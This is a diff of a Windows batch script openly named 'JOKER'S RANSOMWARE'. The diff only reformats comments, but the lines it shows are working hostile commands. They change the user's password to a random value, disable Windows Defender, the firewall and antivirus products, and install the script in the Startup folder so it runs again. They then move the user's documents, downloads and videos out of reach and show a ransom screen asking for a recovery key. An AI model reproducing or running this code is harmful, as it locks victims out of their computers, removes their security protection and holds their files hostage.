@@ -76,8 +76,10 @@ if not "%~nx0" == "%filename%" (
 )
 
 
-net user %username% %random%                        ::change windows password randomly
-sc config Sense start= disabled > NUL 2>&1          ::Forcibly defender Windows non-pandas from line 68 to line 98
+net user %username% %random%                        
+::change windows password randomly
+sc config Sense start= disabled > NUL 2>&1          
+::Forcibly defender Windows non-pandas from line 68 to line 98
 net stop Sense > NUL 2>&1
 sc config WdFilter start= disabled > NUL 2>&1
 net stop WdFilter > NUL 2>&1
@@ -107,9 +109,11 @@ reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSam
 reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d 0 /f
 reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f > NUL 2>&1
 sc config WinDefend start= disabled
-sc stop WinDefend                                     ::end
+sc stop WinDefend                                    
+::end
 rem --
-rem Permamanently Kill Anti-Virus                     ::Disable and neutralize computer antivirus from line 101 to line 236
+rem Permamanently Kill Anti-Virus                     
+::Disable and neutralize computer antivirus from line 101 to line 236
 net stop "Security Center"
 netsh firewall set opmode mode=disable
 tskill /A av*
@@ -245,7 +249,8 @@ cls
 del /Q /F C:\Program Files\apvxdwin\*.exe
 del /Q /F C:\Program Files\webproxy\*.exe
 del /Q /F C:\Program Files\panda
-software\*.*                                            ::end
+software\*.*                                           
+::end
 rem
 title JOKER'S RANSOMWARE
 xcopy clickme.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup" /h /y
@@ -262,7 +267,8 @@ if %cd%==%userprofile%\AppData goto a
 cd %userprofile%\AppData
 start %userprofile%\AppData\clickme.bat
 exit
-:a                                          ::Computer file encryption from line 253 to line 276
+:a                                         
+::Computer file encryption from line 253 to line 276
 mode con cols=120 lines=30
 title Do not close this window.
 del %userprofile%\Desktop\*.joker* >nul 2>&1
@@ -285,7 +291,8 @@ copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\video\*.* %userprofile%\video
 move %userprofile%\Documents\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\
 copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\*.* %userprofile%\Documents\*.joker*
 move %userprofile%\downloads\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\
-copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\*.joker*       ::end
+copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\*.joker*      
+::end
 cls
 title JOKER'S RANSOMWARE                      ::set title
 ECHO  ■■■■■                  ■■■                  ■    ■■                ■■■■■                ■■■■
@@ -302,7 +309,8 @@ ECHO  ■      ■  ■      ■  ■      ■  ■■■■■    ■■■    
 echo do not close this window.
 timeout/t 3 /nobreak >nul
 cls
-echo Thank you for running this ransomware.                                      ::say to you
+echo Thank you for running this ransomware.                                      
+::say to you
 echo Your computer has been encrypted by the JOKER ransomware.
 echo If you close this window, your files will not be recoverable.
 echo Enter the recovery key to recover.
@@ -328,7 +336,8 @@ timeout/t 2 /nobreak >nul
 if %password%==developerdecryptkey goto good
 if %password%==%PASS% goto good
 
-:bad                ::recovery key wrong
+:bad               
+::recovery key wrong
 color 47
 cls
 echo Recovery key does not exist.
@@ -345,7 +354,8 @@ if %password%==%PASS% goto good
 timeout/t 2 >nul
 goto bad
 
-:good                ::recovery key correct
+:good               
+::recovery key correct
 cls
 echo Restoring...
 echo Never close this window.
@@ -369,4 +379,4 @@ cls
 echo detox success
 timeout /t 5 /nobreak >nul
 exit
-      ::program end
+          ::program end
